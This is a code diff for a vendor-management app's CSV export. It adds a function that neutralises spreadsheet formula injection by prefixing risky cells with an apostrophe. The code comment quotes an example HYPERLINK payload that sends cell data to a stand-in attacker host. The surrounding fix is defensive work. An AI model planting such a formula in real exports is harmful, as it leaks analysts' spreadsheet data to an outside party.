@@ -4,6 +4,25 @@ import { exportVendorsRegister, exportAssessments, exportDocumentExpiry } from '
 import { withApiErrorHandling } from '@/lib/errors/api';
 import { jsonResponse } from '@/lib/api-response';
 
+/**
+ * Neutralise spreadsheet formula injection (CWE-1236).
+ *
+ * Excel / Sheets / LibreOffice evaluate any cell whose text begins with
+ * `=`, `+`, `-` or `@` as a formula. Vendor names, notes and document
+ * titles are user-supplied, so a vendor called
+ * `=HYPERLINK("http://attacker/?d="&A1,"click")` executes in the analyst's
+ * spreadsheet the moment they open an export — quoting alone does not stop
+ * this, because the quotes are consumed by the CSV parser before the
+ * spreadsheet sees the value.
+ *
+ * A leading apostrophe forces the cell to text. Tab / CR are included
+ * because a leading whitespace character is stripped by some parsers,
+ * re-exposing the trigger beneath it.
+ */
+function neutraliseFormula(s: string): string {
+    return /^[=+\-@\t\r]/.test(s) ? `'${s}` : s;
+}
+
 // eslint-disable-next-line @typescript-eslint/no-explicit-any
 function toCsv(rows: Record<string, any>[]): string {
     if (rows.length === 0) return '';
@@ -14,7 +33,7 @@ function toCsv(rows: Record<string, any>[]): string {
         lines.push(headers.map(h => {
             const v = row[h];
             if (v == null) return '';
-            const s = String(v);
+            const s = neutraliseFormula(String(v));
             return s.includes(',') || s.includes('"') || s.includes('\n') ? `"${s.replace(/"/g, '""')}"` : s;
         }).join(','));
     }
